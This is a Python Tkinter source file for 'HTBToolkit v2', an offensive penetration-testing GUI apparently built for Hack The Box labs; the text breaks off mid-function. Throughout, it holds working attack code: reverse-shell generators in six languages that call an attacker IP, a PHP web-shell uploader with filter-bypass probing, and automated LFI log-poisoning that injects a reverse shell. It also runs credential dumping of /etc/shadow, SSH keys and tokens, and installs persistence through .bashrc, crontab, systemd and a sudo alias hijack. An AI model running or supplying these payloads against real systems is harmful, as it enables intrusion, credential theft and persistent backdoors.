import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext, filedialog
import socket
import threading
import os
import datetime
import requests

from reverse_shells import get_reverse_shells
from shell_tools import get_system_info, run_command, list_directory, current_user, network_info, running_processes, file_permissions
from file_ops import read_file, write_file, delete_file
from exploit_templates import get_lfi_templates, get_rfi_templates, get_cmd_injection_templates, get_xxe_payloads, get_sqli_payloads
from bruteforce import ssh_bruteforce, ftp_bruteforce

THEMES = {
    "HTB Green": {
        "bg": "#1e1e1e",
        "fg": "#00ff5f",
        "font": ("Consolas", 10),
        "input_bg": "#2e2e2e",
        "input_fg": "#00ff5f",
        "button_bg": "#3e3e3e",
        "button_fg": "#ffffff",
        "text_bg": "#000000",
        "text_fg": "#00ff5f"
    },
    "Kali Blue": {
        "bg": "#0d1b2a",
        "fg": "#00b4d8",
        "font": ("Consolas", 10),
        "input_bg": "#1b263b",
        "input_fg": "#00b4d8",
        "button_bg": "#1e6091",
        "button_fg": "#ffffff",
        "text_bg": "#000814",
        "text_fg": "#00b4d8"
    },
    "Matrix": {
        "bg": "#000000",
        "fg": "#00ff00",
        "font": ("Courier", 10),
        "input_bg": "#101010",
        "input_fg": "#00ff00",
        "button_bg": "#222222",
        "button_fg": "#00ff00",
        "text_bg": "#000000",
        "text_fg": "#00ff00"
    }
}

class HTBToolkitApp:
    def __init__(self, root):
        self.root = root
        self.configure_style()
        self.root.title("HTBToolkit v2")
        self.root.geometry("1200x850")
        self.current_theme_name = "HTB Green"
        self.THEME = THEMES[self.current_theme_name]
        self.root.configure(bg=self.THEME["bg"])

        self.tab_control = ttk.Notebook(root)
        self.tab_control.pack(expand=1, fill='both')

        self.theme_menu = tk.Menu(root)
        self.root.config(menu=self.theme_menu)
        theme_sub = tk.Menu(self.theme_menu, tearoff=0)
        for name in THEMES:
            theme_sub.add_command(label=name, command=lambda n=name: self.change_theme(n))
        self.theme_menu.add_cascade(label="Themes", menu=theme_sub)

        # Tabs
        self.shell_tab = self._create_tab("Shell Tools")
        self.reverse_tab = self._create_tab("Reverse Shells")
        self.exploit_tab = self._create_tab("Exploits")
        self.file_tab = self._create_tab("File Ops")
        self.brute_tab = self._create_tab("BruteForce")
        self.portscan_tab = self._create_tab("Port Scanner")
        self.wordlist_tab = self._create_tab("Wordlists")
        self.export_tab = self._create_tab("Export/Report")
        self.info_tab = self._create_tab("Recon & Enum")
        self.deploy_tab = self._create_tab("Payload Deployment")
        self.listener_tab = self._create_tab("Reverse Listener")
        self.dns_tab = self._create_tab("DNS Scanner")
        self.enum_tab = self._create_tab("System Enum")
        self.creds_tab = self._create_tab("Creds Dump")
        self.persistence_tab = self._create_tab("Persistence")
        self.looting_tab = self._create_tab("Looting")
        self.pivoting_tab = self._create_tab("Pivoting")
        self.remote_tab = self._create_tab("Remote Access")
        self.network_tab = self._create_tab("Network Map")
        self.exploit_finder_tab = self._create_tab("Exploit Finder")
        self.drag_tab = self._create_tab("Drag & Drop")
        self.interactive_tab = self._create_tab("Interactive Shell")

        # Init
        self.init_shell_tab()
        self.init_reverse_tab()
        self.init_reverse_shell_generator()
        self.init_exploit_tab()
        self.init_file_tab()
        self.init_brute_tab()
        self.init_portscan_tab()
        self.init_wordlist_tab()
        self.init_export_tab()
        self.init_info_tab()
        self.init_deploy_tab()
        self.init_listener_tab()
        self.init_dns_tab()
        self.init_enum_tab()
        self.init_creds_tab()
        self.init_persistence_tab()
        self.init_log_wiper()
        self.init_looting_tab()
        self.init_pivoting_tab()
        self.init_port_forwarding_toolkit()
        self.init_remote_tab()
        self.init_network_tab()
        self.init_exploit_finder_tab()
        self.init_drag_tab()
        self.init_interactive_tab()
        self.init_shell_upgrader()

    def change_theme(self, name):
        self.current_theme_name = name
        self.THEME = THEMES[name]
        self.root.configure(bg=self.THEME["bg"])
        messagebox.showinfo("Theme Switched", f"Switched to {name}! Restart app to reapply.")

    def _create_tab(self, name):
        tab = ttk.Frame(self.tab_control)
        self.tab_control.add(tab, text=name)
        return tab

    def _styled_label(self, parent, text):
        lbl = tk.Label(parent, text=text, bg=self.THEME["bg"], fg=self.THEME["fg"], font=("Consolas", 11, "bold"))
        lbl.pack(pady=2)
        return lbl

    def _styled_entry(self, parent, default=""):
        ent = tk.Entry(parent, bg=self.THEME["input_bg"], fg=self.THEME["input_fg"], insertbackground=self.THEME["fg"], font=self.THEME["font"])
        ent.insert(0, default)
        ent.pack(pady=2, fill='x')
        return ent

    def _styled_button(self, parent, text, cmd):
        btn = tk.Button(parent, text=text, command=cmd, bg=self.THEME["button_bg"], fg=self.THEME["button_fg"], font=("Consolas", 10))
        btn.pack(pady=2)
        return btn

    def _styled_text(self, parent, height=15):
        txt = scrolledtext.ScrolledText(parent, height=height, bg=self.THEME["text_bg"], fg=self.THEME["text_fg"], insertbackground=self.THEME["fg"], font=self.THEME["font"])
        txt.pack(pady=2, fill='both', expand=True)
        return txt

    def init_exploit_tab(self):
        self._styled_label(self.exploit_tab, "Target URL")
        self.target_entry = self._styled_entry(self.exploit_tab, "http://example.com/page.php")

        btn_frame = tk.Frame(self.exploit_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "LFI Payloads", self.show_lfi)
        self._styled_button(btn_frame, "RFI Payloads", self.show_rfi)
        self._styled_button(btn_frame, "CMDi Payloads", self.show_cmdi)
        self._styled_button(btn_frame, "XXE Payloads", self.show_xxe)
        self._styled_button(btn_frame, "SQLi Payloads", self.show_sqli)
        self._styled_button(btn_frame, "LFI → RCE (Log Poisoning)", self.log_poison_rce)

        self.exploit_output = self._styled_text(self.exploit_tab, height=25)

    def display_payloads(self, payloads):
        self.exploit_output.delete(1.0, tk.END)
        for p in payloads:
            self.exploit_output.insert(tk.END, p + "\n")

    def show_lfi(self):
        url = self.target_entry.get()
        self.display_payloads(get_lfi_templates(url))

    def show_rfi(self):
        url = self.target_entry.get()
        self.display_payloads(get_rfi_templates(url))

    def show_cmdi(self):
        url = self.target_entry.get()
        self.display_payloads(get_cmd_injection_templates(url))

    def show_xxe(self):
        url = self.target_entry.get()
        self.display_payloads(get_xxe_payloads(url))

    def show_sqli(self):
        url = self.target_entry.get()
        self.display_payloads(get_sqli_payloads(url))

    def init_info_tab(self):
        self._styled_label(self.info_tab, "Information Gathering")

        btn_frame = tk.Frame(self.info_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "Current User", self.show_current_user)
        self._styled_button(btn_frame, "Network Info", self.show_network_info)
        self._styled_button(btn_frame, "Running Processes", self.show_processes)
        self._styled_button(btn_frame, "File Permissions", self.show_permissions)

        self.info_output = self._styled_text(self.info_tab, height=30)

    def show_current_user(self):
        result = current_user()
        self.info_output.delete(1.0, tk.END)
        self.info_output.insert(tk.END, result)

    def show_network_info(self):
        result = network_info()
        self.info_output.delete(1.0, tk.END)
        self.info_output.insert(tk.END, result)

    def show_processes(self):
        result = running_processes()
        self.info_output.delete(1.0, tk.END)
        self.info_output.insert(tk.END, result)

    def show_permissions(self):
        path = filedialog.askopenfilename()
        result = file_permissions(path)
        self.info_output.delete(1.0, tk.END)
        self.info_output.insert(tk.END, result)

    def init_deploy_tab(self):
        self._styled_label(self.deploy_tab, "Backdoor Generator")

        self.backdoor_type = ttk.Combobox(self.deploy_tab, values=["PHP", "Python", "Bash", "Perl", "Netcat", "Ruby"], state="readonly")
        self.backdoor_type.current(0)
        self.backdoor_type.pack(pady=5)

        self._styled_label(self.deploy_tab, "Attacker IP")
        self.gen_ip_entry = self._styled_entry(self.deploy_tab, "10.10.14.23")
        self._styled_label(self.deploy_tab, "Port")
        self.gen_port_entry = self._styled_entry(self.deploy_tab, "9001")

        self._styled_button(self.deploy_tab, "Generate Payload", self.generate_backdoor_payload)
        self._styled_button(self.deploy_tab, "Generate Reverse Payload", self.quick_reverse_shell)
        self._styled_button(self.deploy_tab, "Start Quick Listener", self.start_quick_listener)
        self.backdoor_output = self._styled_text(self.deploy_tab, height=15)

        self._styled_button(self.deploy_tab, "Save Locally", self.save_payload)
        self._styled_button(self.deploy_tab, "Upload to Target", self.upload_payload)
        self._styled_button(self.deploy_tab, "Scan for Upload Vulnerability", self.scan_upload_vuln)
        self._styled_button(self.deploy_tab, "Scan for Writable Directories", self.scan_writable_dirs)

        self._styled_label(self.deploy_tab, "Target Upload URL")
        self.upload_url_entry = self._styled_entry(self.deploy_tab, "http://target/upload.php")

    def generate_backdoor_payload(self):
        ip = self.gen_ip_entry.get()
        port = self.gen_port_entry.get()
        kind = self.backdoor_type.get()

        payloads = {
            "PHP": "<?php system($_GET['cmd']); ?>",
            "Python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
            "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "Netcat": f"nc -e /bin/bash {ip} {port}",
            "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        }
        result = payloads.get(kind, "")
        self.backdoor_output.delete(1.0, tk.END)
        self.backdoor_output.insert(tk.END, result)

    def save_payload(self):
        path = filedialog.asksaveasfilename(defaultextension=".php")
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(self.backdoor_output.get(1.0, tk.END))
            messagebox.showinfo("Saved", "Payload saved locally.")

    def upload_payload(self):
        url = self.upload_url_entry.get()
        files = {'file': ('shell.php', self.backdoor_output.get(1.0, tk.END), 'application/x-php')}
        try:
            r = requests.post(url, files=files, timeout=5)
            messagebox.showinfo("Uploaded", f"Status code: {r.status_code}\nResponse: {r.text[:200]}")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def init_listener_tab(self):
        self._styled_label(self.listener_tab, "Listening Port")
        self.listener_port = self._styled_entry(self.listener_tab, "9001")
        self._styled_button(self.listener_tab, "Start Listener", self.start_listener)
        self.listener_log = self._styled_text(self.listener_tab, height=20)

    def start_listener(self):
        port = int(self.listener_port.get())
        self.listener_log.insert(tk.END, f"[+] Starting listener on port {port}...\n")

        def handler():
            try:
                server = socket.socket()
                server.bind(("0.0.0.0", port))
                server.listen(1)
                conn, addr = server.accept()
                self.listener_log.insert(tk.END, f"[+] Connection from {addr[0]}:{addr[1]}\n")

                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    decoded = data.decode(errors='ignore')
                    self.listener_log.insert(tk.END, decoded)
            except Exception as e:
                self.listener_log.insert(tk.END, f"[!] Error: {e}\n")

        threading.Thread(target=handler, daemon=True).start()

    def init_listener_tab(self):
        self._styled_label(self.listener_tab, "Listening Port")
        self.listener_port = self._styled_entry(self.listener_tab, "9001")
        self._styled_button(self.listener_tab, "Start Listener", self.start_listener)

        self.listener_log = self._styled_text(self.listener_tab, height=20)

        self._styled_label(self.listener_tab, "Send Command")
        self.cmd_entry = self._styled_entry(self.listener_tab)
        self._styled_button(self.listener_tab, "Send", self.send_command)
        self._styled_button(self.listener_tab, "Save Log", self.export_listener_log)

        self.client_conn = None
        self.client_addr = None

    def start_listener(self):
        port = int(self.listener_port.get())
        self.listener_log.insert(tk.END, f"[+] Starting listener on port {port}...\n")

        def handler():
            try:
                server = socket.socket()
                server.bind(("0.0.0.0", port))
                server.listen(5)
                while True:
                    conn, addr = server.accept()
                    self.client_conn = conn
                    self.client_addr = addr
                    self.listener_log.insert(tk.END, f"[+] Connection from {addr[0]}:{addr[1]} at {datetime.datetime.now()}\n")
                    threading.Thread(target=self.handle_client, args=(conn,), daemon=True).start()
            except Exception as e:
                self.listener_log.insert(tk.END, f"[!] Error: {e}\n")

        threading.Thread(target=handler, daemon=True).start()

    def handle_client(self, conn):
        try:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                self.listener_log.insert(tk.END, data.decode(errors='ignore'))
        except:
            self.listener_log.insert(tk.END, "[!] Connection closed\n")

    def send_command(self):
        cmd = self.cmd_entry.get() + "\n"
        if self.client_conn:
            try:
                self.client_conn.send(cmd.encode())
                self.listener_log.insert(tk.END, f"[Sent] {cmd}")
            except:
                self.listener_log.insert(tk.END, "[!] Failed to send command\n")
        else:
            self.listener_log.insert(tk.END, "[!] No active client\n")

    def export_listener_log(self):
        path = filedialog.asksaveasfilename(defaultextension=".txt")
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(self.listener_log.get(1.0, tk.END))
            messagebox.showinfo("Exported", "Listener log saved.")

    def scan_upload_vuln(self):
        url = self.upload_url_entry.get()
        self.backdoor_output.insert(tk.END, f"\n[SCAN] Testing upload on {url}\n")

        payload_variants = [
            ("shell.php", "application/x-php"),
            ("shell.php.jpg", "image/jpeg"),
            ("shell.phar", "application/octet-stream"),
            ("shell.phtml", "application/x-phtml"),
            ("shell.htaccess", "text/plain")
        ]

        test_payload = "<?php echo 'UPLOAD_SUCCESS'; ?>"
        for fname, mtype in payload_variants:
            files = {'file': (fname, test_payload, mtype)}
            try:
                r = requests.post(url, files=files, timeout=5)
                log = f"[{fname}] Status: {r.status_code}"
                if "UPLOAD_SUCCESS" in r.text or "200" in str(r.status_code):
                    log += " => Possible bypass!"
                self.backdoor_output.insert(tk.END, log + "\n")
            except Exception as e:
                self.backdoor_output.insert(tk.END, f"[{fname}] Error: {e}\n")

    def log_poison_rce(self):
        url = self.target_entry.get()
        ip = self.gen_ip_entry.get() if hasattr(self, 'gen_ip_entry') else "127.0.0.1"
        port = self.gen_port_entry.get() if hasattr(self, 'gen_port_entry') else "9001"
        shell_payload = f"<?php exec(\"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"); ?>"

        headers = {
            "User-Agent": shell_payload,
            "X-Forwarded-For": shell_payload
        }

        try:
            # Стъпка 1: инжектираме лог
            r = requests.get(url, headers=headers, timeout=5)
            # Стъпка 2: опит за достъп чрез LFI
            log_paths = ["../../../../var/log/apache2/access.log", "../access.log", "../../log/access.log"]
            found = False
            for path in log_paths:
                lfi_url = url.split("?")[0] + f"?file={path}"
                res = requests.get(lfi_url, timeout=5)
                if "bash -i" in res.text or "UPLOAD_SUCCESS" in res.text or "root" in res.text:
                    self.exploit_output.insert(tk.END, f"[+] LFI worked at {path}\n")
                    self.exploit_output.insert(tk.END, res.text[:1000] + "\n")
                    found = True
                    break
            if not found:
                self.exploit_output.insert(tk.END, "[!] LFI injection failed or not exploitable via logs.\n")
        except Exception as e:
            self.exploit_output.insert(tk.END, f"[!] Error: {e}\n")

    def scan_writable_dirs(self):
        common_dirs = ["/var/www/html", "/var/www", "/srv/http", "/tmp", "/uploads", "/var/tmp", "/dev/shm"]
        results = []
        self.backdoor_output.insert(tk.END, "[SCAN] Testing for writable directories...\n")

        for path in common_dirs:
            try:
                test_file = os.path.join(path, "writetest_htb.txt")
                with open(test_file, "w") as f:
                    f.write("test")
                os.remove(test_file)
                results.append(path)
                self.backdoor_output.insert(tk.END, f"[+] Writable: {path}\n")
            except:
                self.backdoor_output.insert(tk.END, f"[-] Not writable: {path}\n")

        if not results:
            self.backdoor_output.insert(tk.END, "[!] No writable directories found (locally tested).\n")

    def quick_reverse_shell(self):
        ip = self.gen_ip_entry.get()
        port = self.gen_port_entry.get()
        lang = self.backdoor_type.get()
        payloads = {
            "PHP": f"<?php system($_GET['cmd']); ?>",
            "Python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
            "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "Netcat": f"nc -e /bin/bash {ip} {port}",
            "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        }
        self.backdoor_output.delete(1.0, tk.END)
        self.backdoor_output.insert(tk.END, payloads.get(lang, ""))

    def start_quick_listener(self):
        port = int(self.gen_port_entry.get())
        self.backdoor_output.insert(tk.END, f"[+] Quick listener on port {port}\n")

        def handler():
            try:
                sock = socket.socket()
                sock.bind(("0.0.0.0", port))
                sock.listen(1)
                conn, addr = sock.accept()
                self.backdoor_output.insert(tk.END, f"[+] Connection from {addr}\n")
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    self.backdoor_output.insert(tk.END, data.decode(errors='ignore'))
            except Exception as e:
                self.backdoor_output.insert(tk.END, f"[!] Listener error: {e}\n")

        threading.Thread(target=handler, daemon=True).start()

    def init_dns_tab(self):
        self._styled_label(self.dns_tab, "Target Domain")
        self.domain_entry = self._styled_entry(self.dns_tab, "example.com")

        btn_frame = tk.Frame(self.dns_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "Resolve A Record", self.resolve_a_record)
        self._styled_button(btn_frame, "Find Subdomains", self.find_subdomains)
        self._styled_button(btn_frame, "WHOIS Info", self.get_whois_info)

        self.dns_output = self._styled_text(self.dns_tab, height=25)

    def resolve_a_record(self):
        import socket
        domain = self.domain_entry.get()
        try:
            ip = socket.gethostbyname(domain)
            self.dns_output.insert(tk.END, f"A record for {domain}: {ip}\n")
        except Exception as e:
            self.dns_output.insert(tk.END, f"[!] DNS resolution failed: {e}\n")

    def find_subdomains(self):
        import socket
        domain = self.domain_entry.get()
        subdomains = ["www", "mail", "ftp", "admin", "dev", "test", "api", "vpn"]
        found = []
        self.dns_output.insert(tk.END, "[*] Scanning common subdomains...\n")
        for sub in subdomains:
            subdom = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(subdom)
                self.dns_output.insert(tk.END, f"[+] {subdom} -> {ip}\n")
                found.append(subdom)
            except:
                pass
        if not found:
            self.dns_output.insert(tk.END, "[-] No subdomains resolved\n")

    def get_whois_info(self):
        import subprocess
        domain = self.domain_entry.get()
        try:
            result = subprocess.check_output(["whois", domain], stderr=subprocess.DEVNULL).decode(errors='ignore')
            self.dns_output.insert(tk.END, result[:2000] + "\n")
        except:
            self.dns_output.insert(tk.END, "[!] WHOIS failed or not available\n")

    def init_enum_tab(self):
        self._styled_label(self.enum_tab, "System Enumeration")

        btn_frame = tk.Frame(self.enum_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "whoami & id", lambda: self.run_enum("whoami && id"))
        self._styled_button(btn_frame, "sudo -l", lambda: self.run_enum("sudo -l"))
        self._styled_button(btn_frame, "env", lambda: self.run_enum("env"))
        self._styled_button(btn_frame, "/etc/passwd", lambda: self.run_enum("cat /etc/passwd"))
        self._styled_button(btn_frame, "SSH Keys", lambda: self.run_enum("find ~ -name 'id_rsa*'"))
        self._styled_button(btn_frame, "Crontab", lambda: self.run_enum("crontab -l"))
        self._styled_button(btn_frame, "Netstat", lambda: self.run_enum("netstat -tunlp"))
        self._styled_button(btn_frame, "Auto PrivEsc Scan", self.auto_privesc_scan)
        self._styled_button(btn_frame, "Suggest GTFOBins Escapes", self.gtfobins_scan)
        self._styled_button(btn_frame, "Suggest Kernel Exploits", self.suggest_kernel_exploits)
        self._styled_button(btn_frame, "Scan SUID & Capabilities", self.scan_suid_capabilities)

        self._styled_label(self.enum_tab, "Custom Command")
        self.custom_enum_entry = self._styled_entry(self.enum_tab)
        self._styled_button(self.enum_tab, "Run", self.run_custom_enum)

        self.enum_output = self._styled_text(self.enum_tab, height=25)

    def run_enum(self, cmd):
        output = run_command(cmd)
        self.enum_output.delete(1.0, tk.END)
        self.enum_output.insert(tk.END, output)

    def run_custom_enum(self):
        cmd = self.custom_enum_entry.get()
        self.run_enum(cmd)

    def auto_privesc_scan(self):
        checks = {
            "ID": "id",
            "User": "whoami",
            "Kernel": "uname -a",
            "Sudo rights": "sudo -l",
            "SUID Binaries": "find / -perm -4000 -type f 2>/dev/null",
            "Capabilities": "getcap -r / 2>/dev/null",
            "PATH": "echo $PATH",
            "Interesting ENV": "env | grep -Ei 'user|shell|path|home'"
        }

        self.enum_output.insert(tk.END, "[AUTO ENUM] Starting privilege escalation checks...\n")
        for label, cmd in checks.items():
            self.enum_output.insert(tk.END, f"\n[== {label} ==]\n")
            try:
                out = run_command(cmd)
                self.enum_output.insert(tk.END, out[:2000] + "\n")
            except Exception as e:
                self.enum_output.insert(tk.END, f"[-] Failed to run {cmd}: {e}\n")

        self.enum_output.insert(tk.END, "\n[Scan Complete]\n")

    def gtfobins_scan(self):
        binaries = [
            "awk", "less", "vim", "find", "man", "nano", "python", "tar", "bash", "env",
            "perl", "cp", "scp", "rsync", "more", "ftp", "gdb"
        ]

        self.enum_output.insert(tk.END, "[*] Scanning for GTFOBins Escapes...\n")
        for bin in binaries:
            path = run_command(f"which {bin}")
            if path and "/bin" in path:
                sudo_check = run_command(f"sudo -l | grep {bin}")
                if sudo_check:
                    self.enum_output.insert(tk.END, f"[GTFOBIN] {bin} is allowed via sudo!\n")
                    self.enum_output.insert(tk.END, f"-> Try GTFO escape: https://gtfobins.github.io/gtfobins/{bin}/\n\n")
                else:
                    self.enum_output.insert(tk.END, f"[+] Found binary: {bin} at {path.strip()}\n")
        self.enum_output.insert(tk.END, "[Done GTFOBins scan]\n")

    def suggest_kernel_exploits(self):
        kernel = run_command("uname -r").strip()
        self.enum_output.insert(tk.END, f"[Kernel] {kernel}\n")

        suggestions = []

        if kernel.startswith("3.") or kernel.startswith("4.0") or "4.4" in kernel or "4.8" in kernel:
            suggestions.append("Dirty COW: https://www.exploit-db.com/exploits/40839")
        if "5.8" in kernel or "5.10" in kernel or "5.11" in kernel or "5.16" in kernel:
            suggestions.append("Dirty Pipe: https://www.exploit-db.com/exploits/50954")
        if "4." in kernel or "5." in kernel:
            suggestions.append("OverlayFS: https://www.exploit-db.com/exploits/37292")
            suggestions.append("Polkit pkexec: https://www.exploit-db.com/exploits/50978")
            suggestions.append("Snapd exploit: https://www.exploit-db.com/exploits/46060")
        if "capsh" in run_command("which capsh"):
            suggestions.append("Capsh escape via capabilities")

        if suggestions:
            self.enum_output.insert(tk.END, "\n[+] Potential exploits based on kernel version:\n")
            for s in suggestions:
                self.enum_output.insert(tk.END, "- " + s + "\n")
        else:
            self.enum_output.insert(tk.END, "[-] No known exploits matched for current kernel.\n")

    def init_creds_tab(self):
        self._styled_label(self.creds_tab, "Credential Dumping")

        btn_frame = tk.Frame(self.creds_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "Search for 'password' in files", lambda: self.run_creds("grep -Ri password /etc /home 2>/dev/null"))
        self._styled_button(btn_frame, "Dump /etc/shadow", lambda: self.run_creds("cat /etc/shadow"))
        self._styled_button(btn_frame, "List .bash_history", lambda: self.run_creds("cat ~/.bash_history"))
        self._styled_button(btn_frame, "Find .kdbx / .ovpn / .pem", lambda: self.run_creds("find / -type f \\( -name '*.kdbx' -o -name '*.ovpn' -o -name '*.pem' \\) 2>/dev/null"))
        self._styled_button(btn_frame, "Find files with 'token'", lambda: self.run_creds("grep -Ri token /etc /home 2>/dev/null"))

        self._styled_label(self.creds_tab, "Custom grep string")
        self.creds_grep_entry = self._styled_entry(self.creds_tab, "secret|auth|token")
        self._styled_button(self.creds_tab, "Run Custom Grep", self.run_custom_creds)

        self.creds_output = self._styled_text(self.creds_tab, height=25)

    def run_creds(self, cmd):
        output = run_command(cmd)
        self.creds_output.delete(1.0, tk.END)
        self.creds_output.insert(tk.END, output)

    def run_custom_creds(self):
        keyword = self.creds_grep_entry.get()
        cmd = f"grep -RiE '{keyword}' /etc /home 2>/dev/null"
        self.run_creds(cmd)

    def init_persistence_tab(self):
        self._styled_label(self.persistence_tab, "Persistence Techniques")

        btn_frame = tk.Frame(self.persistence_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "Add Reverse Shell to .bashrc", self.persist_bashrc)
        self._styled_button(btn_frame, "Add Crontab Reverse Shell", self.persist_crontab)
        self._styled_button(btn_frame, "Create Systemd Service", self.persist_systemd)
        self._styled_button(btn_frame, "Hijack 'sudo' alias", self.persist_alias)

        self._styled_label(self.persistence_tab, "Custom Payload")
        self.persist_custom_entry = self._styled_entry(self.persistence_tab, "bash -i >& /dev/tcp/10.10.14.6/9001 0>&1")
        self._styled_button(self.persistence_tab, "Append Custom to .bashrc", self.persist_custom_bashrc)

        self.persist_output = self._styled_text(self.persistence_tab, height=20)

    def persist_bashrc(self):
        payload = "bash -i >& /dev/tcp/10.10.14.6/9001 0>&1"
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write(f"\n{payload}\n")
        self.persist_output.insert(tk.END, "[+] Added reverse shell to ~/.bashrc\n")

    def persist_crontab(self):
        payload = "* * * * * bash -i >& /dev/tcp/10.10.14.6/9001 0>&1"
        os.system(f'(crontab -l 2>/dev/null; echo "{payload}") | crontab -')
        self.persist_output.insert(tk.END, "[+] Crontab reverse shell added\n")

    def persist_systemd(self):
        service_code = """
[Unit]
Description=Reverse Shell Persistence

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/9001 0>&1'

[Install]
WantedBy=multi-user.target
"""
        path = "/etc/systemd/system/persist.service"
        try:
            with open(path, "w") as f:
                f.write(service_code)
            os.system("systemctl enable persist.service")
            self.persist_output.insert(tk.END, f"[+] Systemd service created at {path}\n")
        except:
            self.persist_output.insert(tk.END, "[-] Failed to create systemd service (permission?)\n")

    def persist_alias(self):
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write("\nalias sudo='bash -i >& /dev/tcp/10.10.14.6/9001 0>&1'\n")
        self.persist_output.insert(tk.END, "[+] Sudo alias hijack added to .bashrc\n")

    def persist_custom_bashrc(self):
        payload = self.persist_custom_entry.get()
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write(f"\n{payload}\n")
        self.persist_output.insert(tk.END, "[+] Custom payload appended to ~/.bashrc\n")

    def init_looting_tab(self):
        self._styled_label(self.looting_tab, "Post-Exploitation Looting")

        btn_frame = tk.Frame(self.looting_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "Find SSH Keys", lambda: self.run_loot("find / -name id_rsa 2>/dev/null"))
        self._styled_button(btn_frame, "Find .history files", lambda: self.run_loot("find / -name '*.history' 2>/dev/null"))
        self._styled_button(btn_frame, "Find DB & config files", lambda: self.run_loot("find / -type f \\( -name '*.db' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \\) 2>/dev/null"))
        self._styled_button(btn_frame, "Find Git Repos", lambda: self.run_loot("find / -type d -name '.git' 2>/dev/null"))
        self._styled_button(btn_frame, "Find readable root files", lambda: self.run_loot("find / -user root -perm -4 -type f 2>/dev/null | head -n 30"))

        self._styled_label(self.looting_tab, "Custom Find Command")
        self.loot_entry = self._styled_entry(self.looting_tab, "find / -name '*.pem'")
        self._styled_button(self.looting_tab, "Run Custom Find", self.run_custom_loot)

        self.loot_output = self._styled_text(self.looting_tab, height=25)

    def run_loot(self, cmd):
        output = run_command(cmd)
        self.loot_output.delete(1.0, tk.END)
        self.loot_output.insert(tk.END, output)

    def run_custom_loot(self):
        cmd = self.loot_entry.get()
        self.run_loot(cmd)

    def init_pivoting_tab(self):
        self._styled_label(self.pivoting_tab, "Pivoting / Tunneling")

        btn_frame = tk.Frame(self.pivoting_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "Start SSH Dynamic Proxy", self.start_ssh_dynamic)
        self._styled_button(btn_frame, "Generate proxychains.conf", self.gen_proxychains)
        self._styled_button(btn_frame, "Show Active Tunnels", self.show_tunnels)
        self._styled_button(btn_frame, "Generate Chisel Command", self.gen_chisel_cmd)

        self._styled_label(self.pivoting_tab, "Custom SSH Command (e.g. ssh -L)")
        self.custom_pivot_entry = self._styled_entry(self.pivoting_tab, "ssh -L 8080:10.10.10.5:80 user@jump_host")
        self._styled_button(self.pivoting_tab, "Run Custom Tunnel", self.run_custom_pivot)

        self.pivot_output = self._styled_text(self.pivoting_tab, height=20)

    def start_ssh_dynamic(self):
        self.pivot_output.insert(tk.END, "[*] Example SSH -D command:\nssh -D 9050 user@jump_host\n")

    def gen_proxychains(self):
        content = "[ProxyList]\nsocks5 127.0.0.1 9050"
        try:
            with open("proxychains.conf", "w") as f:
                f.write(content)
            self.pivot_output.insert(tk.END, "[+] proxychains.conf generated with SOCKS5 127.0.0.1:9050\n")
        except:
            self.pivot_output.insert(tk.END, "[!] Failed to write proxychains.conf\n")

    def show_tunnels(self):
        result = run_command("ps aux | grep ssh | grep -E '\\-L|\\-D' | grep -v grep")
        self.pivot_output.delete(1.0, tk.END)
        self.pivot_output.insert(tk.END, result if result else "[*] No active SSH tunnels found.\n")

    def gen_chisel_cmd(self):
        chisel_cmd = "chisel client YOURIP:PORT R:LOCALPORT:TARGETIP:PORT"
        self.pivot_output.insert(tk.END, f"[Chisel] {chisel_cmd}\n")

    def run_custom_pivot(self):
        cmd = self.custom_pivot_entry.get()
        try:
